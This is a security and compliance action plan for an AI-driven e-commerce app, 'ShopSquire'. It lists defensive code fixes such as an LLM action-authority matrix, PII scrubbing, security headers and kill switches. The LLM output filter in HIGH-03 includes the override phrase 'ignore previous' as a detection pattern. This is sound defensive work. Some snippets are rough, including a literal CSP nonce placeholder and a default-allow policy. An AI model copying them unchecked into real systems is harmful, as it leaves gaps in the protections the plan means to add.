# ShopSquire — Compliance & Security Master Action Plan
**Date:** 2026-03-26
**Branch:** wip/docker-real-env-20260213
**Scope:** Backend (8080), Frontend (5173), Email/Supply-Chain, Insider Threat
**Frameworks:** PCI DSS 4.0, ISO 27001:2022, ISO 42001:2023, GDPR, EU AI Act, NIST RMF (SP 800-37r2), NIST AI RMF, Australian Privacy Act 1988 (APPs)

---

## How To Read This Document

Each action item carries:
- **Severity** — CRITICAL / HIGH / MEDIUM
- **Effort** — S (≤1 day) / M (2–5 days) / L (1–2 weeks)
- **File:Line** — exact location in the codebase to change
- **Framework Tags** — which compliance requirement this satisfies
- **What to Do** — precise change description

Items are ordered within each severity tier by risk-to-effort ratio (highest ratio first).

---

## SECTION 1 — CRITICAL ITEMS (must fix before any regulated demo or production traffic)

---

### CRIT-01 — Hardcoded audit-chain HMAC secret
**Severity:** CRITICAL | **Effort:** S
**File:** [src/app/security/audit_chain.py:40](src/app/security/audit_chain.py#L40)
**Framework Tags:** ISO 27001 A.8.24, PCI DSS Req 10.3, NIST SP 800-53 AU-10, GDPR Art 25 (integrity)

**Problem:**
```python
_CHAIN_SECRET = os.getenv("AUDIT_CHAIN_SECRET", "shopsquire-audit-chain-hmac-key")
```
The fallback value is a known, committed string. Any attacker with source access can forge the HMAC and silently tamper with the tamper-evident audit log — defeating its entire purpose.

**Fix — audit_chain.py:40:**
```python
def _get_chain_secret() -> str:
    global _CHAIN_SECRET
    if _CHAIN_SECRET is None:
        raw = os.getenv("AUDIT_CHAIN_SECRET", "")
        if not raw:
            import logging
            logging.getLogger(__name__).critical(
                "AUDIT_CHAIN_SECRET not set — audit chain integrity is BROKEN. "
                "Set a strong secret in your environment."
            )
            # In prod, fail closed. In dev/test, allow a dev-only placeholder.
            env = str(os.getenv("APP_ENV", "local")).lower()
            if env in ("prod", "production", "staging"):
                raise RuntimeError("AUDIT_CHAIN_SECRET must be set in non-local environments")
            raw = "dev-only-do-not-use-in-prod"
        _CHAIN_SECRET = raw
    return _CHAIN_SECRET
```
**Also add to:** `config/security/security-hardening.env.example` — document that `AUDIT_CHAIN_SECRET` must be ≥ 32 random bytes, rotated quarterly, stored in Vault.

---

### CRIT-02 — In-memory idempotency cache for payments
**Severity:** CRITICAL | **Effort:** S
**File:** [src/app/routers/payments.py:16](src/app/routers/payments.py#L16)
**Framework Tags:** PCI DSS Req 6.2 (secure code), PCI DSS Req 12.3 (risk management), NIST SP 800-53 SC-5

**Problem:**
```python
_idempotency_cache: set[str] = set()
```
Module-level Python set — lost on restart, not shared across replicas, unbounded in memory. A duplicate payment request can slip through when:
- Process restarts between idempotency check and DB write
- Multiple replicas receive the same idempotency key simultaneously

**Fix — payments.py:16–18:** Remove the module-level set entirely. The DB-backed path (`INSERT OR IGNORE`) already handles it correctly. Replace the `DISABLE_UI_ROUTES` shortcut branch (lines ~47–55) with a Redis atomic SETNX for tests:
```python
# Remove _idempotency_cache entirely.
# In _idempotent(): remove the DISABLE_UI_ROUTES in-memory branch.
# Redis SETNX is available even in test mode via DummyRedis fallback.
```

---

### CRIT-03 — Connector scopes unenforced by default
**Severity:** CRITICAL | **Effort:** S
**File:** [src/app/security/scope_enforcement.py:20](src/app/security/scope_enforcement.py#L20)
**Framework Tags:** PCI DSS Req 7.2 (least privilege), ISO 27001 A.5.15, NIST SP 800-53 AC-6

**Problem:**
```python
enforce = os.getenv("ENFORCE_CONNECTOR_SCOPES", "0").lower() in ("1", "true", "yes")
```
Default is `"0"` — all connector endpoints are wide-open without a token bearing the correct scope. An unauthenticated internal service or misconfigured client gets through.

**Fix:** Flip the default to `"1"` (fail-closed). Gate with environment override for legacy compatibility:
```python
enforce = os.getenv("ENFORCE_CONNECTOR_SCOPES", "1").lower() not in ("0", "false", "no")
```
Add `ENFORCE_CONNECTOR_SCOPES=1` to the production env template and `docker-compose.yml` under the `api` service environment block.

---

### CRIT-04 — Celery task signing disabled by default
**Severity:** CRITICAL | **Effort:** M
**File:** [config/security/security-hardening.env.example:17](config/security/security-hardening.env.example#L17)
**Framework Tags:** PCI DSS Req 6.4 (protect public-facing apps), ISO 27001 A.8.20, NIST SP 800-53 SI-7 (software integrity)

**Problem:**
`CELERY_TASK_SIGNING_ENABLED=0` — unsigned Celery messages on the queue can be forged or replayed. Any service with Redis/RabbitMQ access can inject arbitrary tasks (ticket creation, email dispatch, supply-chain scan triggers).

**Fix:**
1. Set `CELERY_TASK_SIGNING_ENABLED=1` in `docker-compose.yml` `celery-worker` environment block.
2. Generate certs in CI and mount to `/etc/shopsquire/certs/`. Document cert rotation in runbook.
3. Add a startup health check in `src/app/workers/celery_app.py` that aborts if signing is disabled in non-local envs:
```python
import os, sys
if str(os.getenv("APP_ENV","local")).lower() not in ("local","dev","test"):
    if str(os.getenv("CELERY_TASK_SIGNING_ENABLED","0")).strip() != "1":
        sys.exit("FATAL: Celery task signing must be enabled in non-local environments")
```

---

### CRIT-05 — No policy decision engine — LLM is final arbiter on high-impact actions
**Severity:** CRITICAL | **Effort:** L
**File:** New file — [src/app/policy/action_authority_matrix.py](src/app/policy/action_authority_matrix.py) + [src/app/routers/payments.py](src/app/routers/payments.py) + [src/app/routers/returns.py](src/app/routers/returns.py)
**Framework Tags:** EU AI Act Art 9 (risk management), ISO 42001 Cl 6.1.2, NIST AI RMF GOVERN-1.2, GDPR Art 22 (automated decision-making)

**Problem:**
The LLM orchestrator currently recommends AND executes high-impact actions (refunds, bank-detail changes, supplier onboarding, payment dispatch) without a deterministic policy layer intercepting first. Under GDPR Art 22 and EU AI Act, automated decisions that materially affect persons must have human oversight and contestability mechanisms.

**New file: `src/app/policy/action_authority_matrix.py`**
```python
"""Deterministic policy engine — sits between LLM recommendation and execution.

The LLM RECOMMENDS. This module AUTHORIZES or BLOCKS.
Never allow the model to be the final arbiter on high-impact actions.
"""
from __future__ import annotations
import os
from dataclasses import dataclass
from enum import Enum
from typing import Any, Dict, Optional


class AuthDecision(str, Enum):
    ALLOW = "allow"
    DUAL_CONTROL = "dual_control"   # Requires second approver
    BLOCK = "block"                  # Hard block, create ticket, alert
    HUMAN_REVIEW = "human_review"   # Queue for operator, freeze action


@dataclass
class PolicyVerdict:
    decision: AuthDecision
    reason: str
    requires_2fa: bool = False
    alert_siem: bool = False
    create_ticket: bool = False


# --- Action Authority Matrix ---
# Format: (action_type, value_threshold_aud) -> (decision, reason, flags...)
# Thresholds in AUD cents to avoid float comparison issues.
_MATRIX: list[dict] = [
    # Payment / refund actions
    {"action": "refund", "max_aud_cents": 5000,   "decision": AuthDecision.ALLOW,         "reason": "below auto-refund threshold"},
    {"action": "refund", "max_aud_cents": 50000,  "decision": AuthDecision.DUAL_CONTROL,  "reason": "mid-value refund requires second approver", "requires_2fa": True},
    {"action": "refund", "max_aud_cents": None,    "decision": AuthDecision.HUMAN_REVIEW,  "reason": "high-value refund frozen for human review", "alert_siem": True, "create_ticket": True},
    # Bank / payment-destination changes
    {"action": "bank_change",    "max_aud_cents": None, "decision": AuthDecision.BLOCK,  "reason": "bank-detail changes require out-of-band verification", "alert_siem": True, "create_ticket": True},
    {"action": "supplier_add",   "max_aud_cents": None, "decision": AuthDecision.HUMAN_REVIEW, "reason": "new supplier requires compliance vetting", "create_ticket": True},
    {"action": "supplier_pay",   "max_aud_cents": 100000, "decision": AuthDecision.DUAL_CONTROL, "reason": "supplier payment requires dual control", "requires_2fa": True},
    {"action": "supplier_pay",   "max_aud_cents": None,   "decision": AuthDecision.HUMAN_REVIEW, "reason": "large supplier payment frozen", "alert_siem": True, "create_ticket": True},
    # PII / account changes
    {"action": "pii_export",     "max_aud_cents": None, "decision": AuthDecision.BLOCK, "reason": "PII bulk export blocked — use approved data request workflow", "alert_siem": True},
    {"action": "account_recovery","max_aud_cents": None, "decision": AuthDecision.HUMAN_REVIEW, "reason": "account recovery requires identity verification"},
    # Agent tool use
    {"action": "tool_egress",    "max_aud_cents": None, "decision": AuthDecision.BLOCK, "reason": "agent egress to unlisted domain blocked — add to egress allowlist"},
]


def evaluate(
    action: str,
    value_aud_cents: int = 0,
    context: Optional[Dict[str, Any]] = None,
) -> PolicyVerdict:
    """Evaluate an action against the authority matrix.

    Returns a PolicyVerdict. Callers MUST check verdict.decision before
    executing the action — the LLM recommendation is NOT sufficient.
    """
    for rule in _MATRIX:
        if rule["action"] != action:
            continue
        threshold = rule.get("max_aud_cents")
        if threshold is not None and value_aud_cents <= threshold:
            return PolicyVerdict(
                decision=rule["decision"],
                reason=rule["reason"],
                requires_2fa=rule.get("requires_2fa", False),
                alert_siem=rule.get("alert_siem", False),
                create_ticket=rule.get("create_ticket", False),
            )
        if threshold is None:
            return PolicyVerdict(
                decision=rule["decision"],
                reason=rule["reason"],
                requires_2fa=rule.get("requires_2fa", False),
                alert_siem=rule.get("alert_siem", False),
                create_ticket=rule.get("create_ticket", False),
            )
    # Default: allow with audit
    return PolicyVerdict(decision=AuthDecision.ALLOW, reason="no matching rule — default allow")
```

**Wire into payments.py** — add before any payment execution:
```python
from src.app.policy.action_authority_matrix import evaluate, AuthDecision
verdict = evaluate("refund", value_aud_cents=int(amount * 100))
if verdict.decision == AuthDecision.BLOCK:
    raise HTTPException(status_code=403, detail=f"Policy block: {verdict.reason}")
if verdict.decision == AuthDecision.HUMAN_REVIEW:
    # Freeze action, create ticket, return 202 Accepted with review reference
    ...
```

---

### CRIT-06 — No PII scrubbing before LLM prompts
**Severity:** CRITICAL | **Effort:** M
**File:** [src/app/security/dlp_export.py](src/app/security/dlp_export.py) + [src/app/routers/recommend.py:~2865](src/app/routers/recommend.py#L2865)
**Framework Tags:** GDPR Art 5(1)(c) (data minimisation), Australian Privacy Act APP 11.1, ISO 27001 A.8.11, EU AI Act Art 10(5)

**Problem:**
`dlp_export.py` scrubs secrets (AWS keys, Bearer tokens, etc.) but does **not** scrub PII (email addresses, phone numbers, PAN fragments, full names, dates of birth) before those strings are sent to external LLM providers (OpenAI/Anthropic APIs). This is a data-minimisation violation under GDPR and APP 11.

**Fix — add to dlp_export.py:**
```python
import re

_PII_PATTERNS = [
    # Email
    (re.compile(r'\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b'), '[EMAIL]'),
    # Australian mobile / phone
    (re.compile(r'\b(?:\+61|0)[2-9]\d{8}\b'), '[PHONE]'),
    # Credit card (Luhn-like 13-19 digit groups)
    (re.compile(r'\b(?:\d[ \-]?){13,19}\b'), '[PAN]'),
    # Full name heuristic (Title + Word Word)
    (re.compile(r'\b(?:Mr|Ms|Mrs|Dr|Prof)\.?\s+[A-Z][a-z]+\s+[A-Z][a-z]+\b'), '[NAME]'),
    # Date of birth
    (re.compile(r'\b\d{1,2}[\/\-]\d{1,2}[\/\-]\d{2,4}\b'), '[DOB]'),
    # Tax File Number (Australia)
    (re.compile(r'\b\d{3}\s?\d{3}\s?\d{3}\b'), '[TFN]'),
]

def dlp_scrub_pii(text: str) -> tuple[str, int]:
    """Scrub PII before sending to external LLM providers."""
    out, hits = text, 0
    for pattern, replacement in _PII_PATTERNS:
        new = pattern.sub(replacement, out)
        if new != out:
            hits += 1
        out = new
    return out, hits
```

**Wire into recommend.py:~2865** and every place that builds LLM prompts — call `dlp_scrub_pii(prompt)` before the prompt leaves the service boundary.

---

### CRIT-07 — No CSP / security headers on frontend
**Severity:** CRITICAL | **Effort:** M
**File:** [frontend/vite.config.ts](frontend/vite.config.ts) + [src/app/routers/ui_storefront.py](src/app/routers/ui_storefront.py)
**Framework Tags:** PCI DSS Req 6.4.3, OWASP Top 10 A05 (Security Misconfiguration), ISO 27001 A.8.9

**Problem:**
No `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Permissions-Policy`, or `Referrer-Policy` headers are emitted by the Vite dev server or the FastAPI UI router. This leaves the storefront (5173) and admin panel open to XSS, clickjacking, and data exfiltration.

**Fix — add to `src/app/main.py` as middleware (affects all 8080 responses):**
```python
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
        # CSP: tighten progressively — start with report-only, then enforce
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self' 'nonce-{nonce}'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: blob:; "
            "connect-src 'self' ws://localhost:8080 wss:; "
            "frame-ancestors 'none'; "
            "report-uri /api/v1/security/csp-report"
        )
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
        return response

app.add_middleware(SecurityHeadersMiddleware)
```

**For Vite dev server — `frontend/vite.config.ts`:**
```typescript
server: {
  headers: {
    'X-Frame-Options': 'DENY',
    'X-Content-Type-Options': 'nosniff',
    'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-eval'; connect-src 'self' http://localhost:8080 ws://localhost:8080",
  }
}
```

---

### CRIT-08 — No CSRF protection on state-changing frontend API calls
**Severity:** CRITICAL | **Effort:** M
**File:** [src/app/routers/auth.py](src/app/routers/auth.py) + [frontend/src/lib/api.ts](frontend/src/lib/api.ts)
**Framework Tags:** PCI DSS Req 6.2.4, OWASP Top 10 A01, ISO 27001 A.8.9

**Problem:**
The auth router issues JWT cookies but there is no double-submit CSRF token or `SameSite=Strict` enforcement visible. Cart mutations, checkout initiation, and profile changes from the 5173 frontend are vulnerable to cross-site request forgery.

**Fix — auth.py (cookie issuance):**
```python
# When setting JWT cookie, enforce SameSite=Strict and Secure in non-local
response.set_cookie(
    "ss_session",
    value=token,
    httponly=True,
    secure=not is_local_env,
    samesite="Strict",
    max_age=3600,
    path="/api/v1/",
)
```

**Fix — add CSRF double-submit middleware to main.py:**
```python
# For all non-GET /api/v1/ routes, validate X-CSRF-Token header matches cookie
# Use itsdangerous TimestampSigner for the CSRF token
```

---

### CRIT-09 — Metrics endpoint exposed without authentication in non-local envs
**Severity:** CRITICAL | **Effort:** S
**File:** [src/app/observability/metrics.py](src/app/observability/metrics.py)
**Framework Tags:** PCI DSS Req 7.3, ISO 27001 A.8.2, NIST SP 800-53 AU-9

**Problem:**
`/metrics` (Prometheus endpoint) exposes detailed counters including `incident_alerts_total`, `rate_limit_exceeded_total`, `tickets_created_total` with topic/severity/endpoint labels. An attacker can map the entire incident pipeline and understand detection thresholds.

**Fix — metrics.py:** Add IP allowlist + bearer token check before serving metrics:
```python
METRICS_ALLOW_CIDRS = os.getenv("METRICS_ALLOW_CIDRS", "127.0.0.1/32,10.0.0.0/8")

@router.get("/metrics")
async def get_metrics(request: Request):
    client_ip = request.client.host
    if not _ip_in_allowed_cidrs(client_ip, METRICS_ALLOW_CIDRS):
        auth = request.headers.get("Authorization", "")
        token = os.getenv("METRICS_BEARER_TOKEN", "")
        if not token or not hmac.compare_digest(auth, f"Bearer {token}"):
            raise HTTPException(status_code=403, detail="metrics access denied")
    return Response(generate_latest(REGISTRY), media_type="text/plain; version=0.0.4")
```

---

### CRIT-10 — No data residency controls (Australian Privacy Act APP 8.1)
**Severity:** CRITICAL | **Effort:** L
**File:** New file — [src/app/policy/data_residency.py](src/app/policy/data_residency.py) + [src/app/config.py](src/app/config.py)
**Framework Tags:** Australian Privacy Act APP 8 (cross-border disclosure), GDPR Art 44–49 (transfers), ISO 27001 A.5.33

**Problem:**
Customer PII is sent to LLM providers (likely US-hosted) without documenting the lawful transfer mechanism. Under APP 8.1, the entity must take reasonable steps to ensure overseas recipients handle the data in accordance with the APPs or hold the originating entity accountable.

**Fix — new `src/app/policy/data_residency.py`:**
```python
"""Data residency and cross-border transfer gate.

Enforces transfer mechanism documentation before PII leaves the Australian
data boundary. Designed against APP 8 (Privacy Act 1988) and GDPR Art 44-49.
"""
from __future__ import annotations
import os
from enum import Enum
from dataclasses import dataclass

class TransferMechanism(str, Enum):
    SCCs = "standard_contractual_clauses"     # GDPR adequacy
    BINDING_CORPORATE_RULES = "bcr"
    ADEQUACY_DECISION = "adequacy"            # EU → AU reciprocal
    CONSENT = "explicit_consent"              # Last resort, documented
    BLOCKED = "blocked"

@dataclass
class ResidencyVerdict:
    allowed: bool
    mechanism: TransferMechanism
    destination_country: str
    notes: str

# Register approved LLM providers and their transfer mechanisms
_APPROVED_PROVIDERS: dict[str, ResidencyVerdict] = {
    "openai": ResidencyVerdict(True, TransferMechanism.SCCs, "US", "OpenAI DPA + SCCs executed 2025-01"),
    "anthropic": ResidencyVerdict(True, TransferMechanism.SCCs, "US", "Anthropic DPA + SCCs executed 2025-01"),
    "ollama_local": ResidencyVerdict(True, TransferMechanism.ADEQUACY_DECISION, "AU", "On-premise, no transfer"),
}

def check_transfer(provider_key: str) -> ResidencyVerdict:
    verdict = _APPROVED_PROVIDERS.get(provider_key)
    if verdict is None:
        return ResidencyVerdict(False, TransferMechanism.BLOCKED, "unknown", f"Provider '{provider_key}' not in approved transfer list")
    return verdict
```

---

## SECTION 2 — HIGH ITEMS

---

### HIGH-01 — No formal AI inventory (ISO 42001 Cl 4.1 / EU AI Act Art 11)
**Severity:** HIGH | **Effort:** M
**File:** New file — [docs/AI-SYSTEM-INVENTORY.md](docs/AI-SYSTEM-INVENTORY.md) + [config/ai_governance/model_registry.json](config/ai_governance/model_registry.json)
**Framework Tags:** ISO 42001 Cl 4.1, EU AI Act Art 11, NIST AI RMF GOVERN-1.1

**Problem:**
ShopSquire operates 26+ AI agents with no documented inventory of model IDs, owners, intended use, prohibited use, risk classification, training data lineage, retraining schedule, or approval workflow. This is a baseline requirement for ISO 42001 certification and EU AI Act compliance.

**Fix — create `config/ai_governance/model_registry.json`:**
```json
{
  "schema_version": "1.0",
  "last_reviewed": "2026-03-26",
  "reviewer": "AI Governance Officer",
  "models": [
    {
      "id": "fraud_scorer_v3",
      "name": "Fraud Scoring Agent",
      "type": "rule_ensemble + ml",
      "owner": "security-team",
      "intended_use": "Real-time transaction fraud scoring (0–1) for order acceptance decisions",
      "prohibited_use": ["sole basis for account termination without human review", "credit scoring"],
      "risk_class": "high",
      "eu_ai_act_category": "high_risk",
      "gdpr_art22_applicable": true,
      "training_data_description": "Synthetic + anonymised historical order data, no live PAN",
      "last_eval_date": "2026-02-01",
      "eval_f1": 0.94,
      "rollback_version": "fraud_scorer_v2",
      "retraining_cadence": "quarterly",
      "approver": "CISO + DPO"
    }
  ]
}
```

**Also create `src/app/policy/model_registry.py`** — runtime loader that gates model use against registry entries and aborts deployment if any `risk_class=high` model lacks a review within 90 days.

---

### HIGH-02 — RBAC policy not enforced at route level
**Severity:** HIGH | **Effort:** M
**File:** [src/app/security/rbac.py](src/app/security/rbac.py) + all admin routers
**Framework Tags:** PCI DSS Req 7.2.1, ISO 27001 A.5.15, NIST SP 800-53 AC-3

**Problem:**
`rbac.py` has `enforce_rbac(role, resource, action)` but router files use `require_role()` from `security/auth.py` which only checks role membership, not resource/action permissions. The policy file at `config/security/rbac_policy.json` is loaded but not wired into route decorators.

**Fix — create `src/app/security/rbac_dep.py`** as FastAPI dependency:
```python
from fastapi import Depends, HTTPException
from src.app.security.auth import get_current_role
from src.app.security.rbac import enforce_rbac

def require_permission(resource: str, action: str):
    async def _dep(role: str = Depends(get_current_role)):
        if not enforce_rbac(role, resource, action):
            raise HTTPException(status_code=403, detail=f"Role '{role}' lacks {action} on {resource}")
        return role
    return _dep
```

**Wire into admin routers** — e.g., `admin_api_keys.py`, `admin_compliance_registry.py`, `admin_supply_chain.py`:
```python
@router.delete("/api/v1/admin/api-keys/{key_id}")
async def delete_api_key(..., _=Depends(require_permission("api_keys", "delete"))):
```

---

### HIGH-03 — No output filtering / hallucination escape detection
**Severity:** HIGH | **Effort:** M
**File:** [src/app/routers/recommend.py:~2865](src/app/routers/recommend.py#L2865)
**Framework Tags:** EU AI Act Art 13 (transparency), ISO 42001 Cl 6.2, NIST AI RMF MEASURE-2.5, OWASP LLM Top 10 2025 LLM02

**Problem:**
LLM responses are returned to end users after `_summarize_results()` but there is no check for:
- PII leaked from the model's training data (membership inference)
- System prompt fragments echoed in response
- Instruction injection escape attempts in model output
- False factual claims about products (price hallucination, spec fabrication)

**Fix — add `src/app/security/output_filter.py`:**
```python
"""LLM output filtering — catches PII leakage, prompt echo, and factual escape."""
import re
from typing import Tuple

_SYS_PROMPT_ECHO = re.compile(
    r'(?i)(you are a|your instructions|system prompt|as an ai language model|ignore previous)'
)
_PII_IN_OUTPUT = re.compile(
    r'\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b'  # email
    r'|\b(?:\+61|0)[2-9]\d{8}\b'  # AU phone
)

def filter_llm_output(text: str, allowed_product_skus: list[str]) -> Tuple[str, list[str]]:
    """Return (filtered_text, list_of_triggered_rules)."""
    triggered = []
    if _SYS_PROMPT_ECHO.search(text):
        triggered.append("system_prompt_echo")
        text = re.sub(_SYS_PROMPT_ECHO, "[FILTERED]", text)
    if _PII_IN_OUTPUT.search(text):
        triggered.append("pii_in_output")
        text = _PII_IN_OUTPUT.sub("[REDACTED]", text)
    return text, triggered
```

**Wire into `recommend.py`** after every `_summarize_results()` call and log `triggered` rules to the decision trace.

---

### HIGH-04 — No human escalation kill switch per workflow
**Severity:** HIGH | **Effort:** M
**File:** [src/app/routers/escalation_room.py](src/app/routers/escalation_room.py) + [src/app/policy/action_authority_matrix.py](src/app/policy/action_authority_matrix.py)
**Framework Tags:** EU AI Act Art 14 (human oversight), ISO 42001 Cl 8.4, NIST AI RMF GOVERN-4.2

**Problem:**
The escalation room is acknowledged as "currently broken" in memory. There is no per-workflow or per-tenant kill switch for autonomous action. Under EU AI Act Art 14, high-risk AI systems must have humans able to override or interrupt the system.

**Fix — add kill switch table to DB + check in orchestrator:**
```sql
-- migration: add to existing schema
CREATE TABLE IF NOT EXISTS autonomy_kill_switches (
    workflow   TEXT PRIMARY KEY,
    tenant_id  TEXT,
    disabled   BOOLEAN NOT NULL DEFAULT FALSE,
    disabled_by TEXT,
    disabled_at TIMESTAMP,
    reason     TEXT
);
```

```python
# src/app/policy/kill_switch.py
def is_workflow_disabled(workflow: str, tenant_id: str | None = None) -> bool:
    with db_session() as db:
        row = db.execute(text(
            "SELECT disabled FROM autonomy_kill_switches "
            "WHERE workflow=:w AND (tenant_id IS NULL OR tenant_id=:t) LIMIT 1"
        ), {"w": workflow, "t": tenant_id}).fetchone()
        return bool(row and row[0])
```

**Add kill switch check at the top of the orchestrator `PLAN` and `ACTION` phases in `recommend.py`.**

---

### HIGH-05 — No DPIA / PIA documented for AI-driven fraud scoring
**Severity:** HIGH | **Effort:** M
**File:** New file — [docs/DPIA-AI-FRAUD-SCORING.md](docs/DPIA-AI-FRAUD-SCORING.md)
**Framework Tags:** GDPR Art 35, Australian Privacy Act APP 1.4 (privacy management), EU AI Act Art 9, ISO 42001 Cl 6.1.4

**Problem:**
Fraud scoring makes automated decisions about order acceptance/rejection that materially affect customers (GDPR Art 22 trigger). A DPIA is mandatory before deployment. No DPIA exists.

**Minimum DPIA content to document:**
- Description of processing, purposes, and necessity
- Assessment of risks to rights and freedoms (false positive = denied order, reputational harm)
- Measures to address risks (human review path, contestability, accuracy metrics, demographic bias testing)
- DPO consultation outcome
- Retention period for scores and decision rationale
- Right to explanation implementation

See [docs/DPIA-AI-FRAUD-SCORING.md](docs/DPIA-AI-FRAUD-SCORING.md) (to be created from template in this doc).

---

### HIGH-06 — Supply chain CV dependencies still missing in Docker
**Severity:** HIGH | **Effort:** M
**File:** [docker-compose.yml](docker-compose.yml) — `api` service `build:` context + Dockerfile
**Framework Tags:** ISO 27001 A.8.8 (technical vulnerability management), NIST SP 800-53 SA-10

**Problem (from MEMORY BUG-3):**
`pyzbar`, `pytesseract`, `paddleocr`, `imagehash` not installed in the Docker container. All CV security events (QR decode, OCR, steganography detection) silently fail — the security matrix shows no events even when a QR attack image is submitted.

**Fix — Dockerfile (add to requirements.txt and OS packages):**
```dockerfile
# OS packages (before pip install)
RUN apt-get update && apt-get install -y \
    libzbar0 libzbar-dev \
    tesseract-ocr tesseract-ocr-eng \
    libgl1-mesa-glx libglib2.0-0 \
    && rm -rf /var/lib/apt/lists/*

# requirements.txt additions
pyzbar==0.1.9
pytesseract==0.3.10
imagehash==4.3.1
# paddleocr is large — use lightweight alternative if image size is a concern:
# easyocr==1.7.1
```

**Add CV readiness health check to `scripts/live_demo_gate.py` Gate 1:**
```python
# Gate 1b: CV dependency check
resp = requests.get(f"{base_url}/api/v1/cv/readiness")
cv_ok = resp.json().get("pyzbar_available") and resp.json().get("tesseract_available")
assert cv_ok, "CV dependencies missing — QR/OCR security detection will silently fail"
```

---

### HIGH-07 — Email lab auth key mismatch not auto-detected / surfaced
**Severity:** HIGH | **Effort:** S
**File:** [src/app/routers/email_security.py](src/app/routers/email_security.py) + [frontend/src/App.tsx](frontend/src/App.tsx)
**Framework Tags:** ISO 27001 A.5.17 (authentication information), PCI DSS Req 8.2

**Problem (from MEMORY BUG-8):**
The email lab shows "SECURITY REVIEW — ERROR" when the OWNER_API_KEY doesn't match. The error is a 401/403 but is rendered as a generic string, leaving operators confused. Also, the correct key is never automatically injected from the backend into the frontend session.

**Fix — email_security router:** Return a structured error with a `www_authenticate_hint`:
```python
if not _verify_owner_key(api_key):
    raise HTTPException(
        status_code=401,
        detail={"error": "invalid_api_key", "hint": "Check OWNER_API_KEY env var or set localStorage.ss_owner_key"},
        headers={"WWW-Authenticate": "ApiKey"},
    )
```

**Fix — frontend:** On `401` from email lab endpoint, display:
```typescript
if (resp.status === 401) {
  setError("Auth error — run: localStorage.setItem('ss_owner_key', 'YOUR_KEY') and reload");
}
```

---

### HIGH-08 — No formal incident response SLA / severity model in code
**Severity:** HIGH | **Effort:** M
**File:** [src/app/services/ticketing.py](src/app/services/ticketing.py) + [src/app/routers/incident.py](src/app/routers/incident.py)
**Framework Tags:** ISO 27001 A.5.26 (response to incidents), NIST SP 800-61r3, PCI DSS Req 12.10

**Problem:**
Tickets are created but there is no SLA enforcement. A `priority=critical` ticket can sit without an escalation timer. Under PCI DSS 12.10 and ISO 27001 A.5.26 the incident response plan must specify timeframes.

**Fix — `ticketing.py`:** Add SLA column and escalation cron:
```python
SLA_MINUTES = {"critical": 15, "high": 60, "medium": 240, "low": 1440}

# On ticket creation, set sla_due = now + SLA_MINUTES[priority]
# Add Celery beat task that polls tickets WHERE sla_due < now AND status != 'resolved'
# and fires an alert to the SIEM / on-call channel
```

---

### HIGH-09 — No SBOM published or verified at build time
**Severity:** HIGH | **Effort:** M
**File:** [src/app/services/sbom_scheduler.py](src/app/services/sbom_scheduler.py) + CI pipeline
**Framework Tags:** PCI DSS Req 6.3.2 (inventory of bespoke/custom software), NIST SP 800-53 SA-17, EU AI Act Art 17

**Problem:**
`sbom_scheduler.py` exists but there is no CI gate that blocks a build if the SBOM contains a CISA KEV CVE. The supply chain scanner (`supply_chain_security.py`) checks at runtime but not at build time.

**Fix — add to CI (GitHub Actions or equivalent):**
```yaml
- name: Generate SBOM
  run: pip install cyclonedx-bom && cyclonedx-py poetry --output sbom.json

- name: Check SBOM against CISA KEV
  run: python scripts/check_sbom_kev.py sbom.json  # fail if any KEV CVE found
```

**Create `scripts/check_sbom_kev.py`** — fetches CISA KEV JSON, extracts CVE IDs, checks against CycloneDX sbom.json component vulnerabilities, exits non-zero if overlap found.

---

### HIGH-10 — NQE context loss not fixed (BUG-1 from MEMORY)
**Severity:** HIGH | **Effort:** S
**File:** [src/app/routers/recommend.py:~5020](src/app/routers/recommend.py#L5020)
**Framework Tags:** ISO 42001 Cl 8.3 (AI system performance), NIST AI RMF MEASURE-1.1

**Problem:**
`NQEInput.previously_asked_ids` exists in `flows/nqe.py:33` but `recommend.py` never loads `nqe_asked_ids` from Redis before calling NQE → same questions asked every turn → poor user experience AND a potential compliance issue (GDPR Art 22 — decisions must be explainable and coherent across a session).

**Fix — recommend.py:~5020:**
```python
# Before building NQEInput, load from Redis
kv_state = await redis_get_json(f"session:{uid}:kv_state") or {}
nqe_asked_ids = kv_state.get("nqe_asked_ids", [])
nqe_answered_fields = kv_state.get("nqe_answered_fields", {})

nqe_input = NQEInput(
    ...
    previously_asked_ids=nqe_asked_ids,
    answered_fields=nqe_answered_fields,
)
```

---

## SECTION 3 — MEDIUM ITEMS

---

### MED-01 — LLM summary doesn't answer direct questions (BUG-6)
**Severity:** MEDIUM | **Effort:** S
**File:** [src/app/routers/recommend.py:~2865](src/app/routers/recommend.py#L2865)
**Framework Tags:** EU AI Act Art 13 (transparency), ISO 42001 Cl 8.3 (answer quality)

**Fix — rewrite `_summarize_results` prompt:**
```python
prompt = f"""You are ShopSquire, an ecommerce AI assistant.
RULE 1: If the user asked a yes/no question, answer YES or NO in the FIRST sentence with a brief reason.
RULE 2: Then list the top matching products with the key specs that answer their query.
RULE 3: Do not start with "I found X products" — that is not answering their question.

User question: {user_query}
Products: {product_json}
Answer:"""
```

---

### MED-02 — Budget answer requires named brand (BUG-7)
**Severity:** MEDIUM | **Effort:** S
**File:** [src/app/routers/recommend.py:~2995](src/app/routers/recommend.py#L2995)
**Framework Tags:** ISO 42001 Cl 8.3

**Fix — `_build_brand_budget_answer`:** Add generic branch:
```python
if not brand:
    # Generic budget answer
    return f"Yes, ${budget} is {'enough' if cheapest_match <= budget else 'tight'} for {use_case}. " \
           f"The best option in that range is the {top_match['name']} at ${top_match['price']:.0f}."
```

---

### MED-03 — No formal RoPA (Record of Processing Activities)
**Severity:** MEDIUM | **Effort:** M
